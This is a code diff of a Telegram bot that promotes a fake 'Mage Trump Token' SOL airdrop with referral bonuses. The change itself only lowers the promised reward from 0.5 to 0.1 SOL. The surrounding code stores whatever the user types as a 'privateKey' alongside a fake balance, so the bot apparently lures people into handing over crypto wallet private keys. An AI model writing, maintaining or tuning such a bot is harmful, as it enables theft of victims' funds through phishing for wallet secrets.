@@ -100,7 +100,7 @@ bot.command('link', (ctx) => {
   const message = `
 📢 Want free SOL?
 
-Join the *Mage Trump Token* airdrop and earn 0.5 SOL instantly!  
+Join the *Mage Trump Token* airdrop and earn 0.1 SOL instantly!  
 🎯 Plus, get 0.1 SOL for each wizard you invite.
 
 🚀 Use my referral link now:  
@@ -163,12 +163,12 @@ bot.on('text', async (ctx) => {
         privateKey: input,
         referral: null,
         createdAt: new Date(),
-        balance: 0.5,
+        balance: 0.1,
         claimed: false,
         refCount: 0,
         canClaim: false,
       });
-      projectBalance = '0.5';
+      projectBalance = '0.1';
     }
 
     ctx.session ??= {};
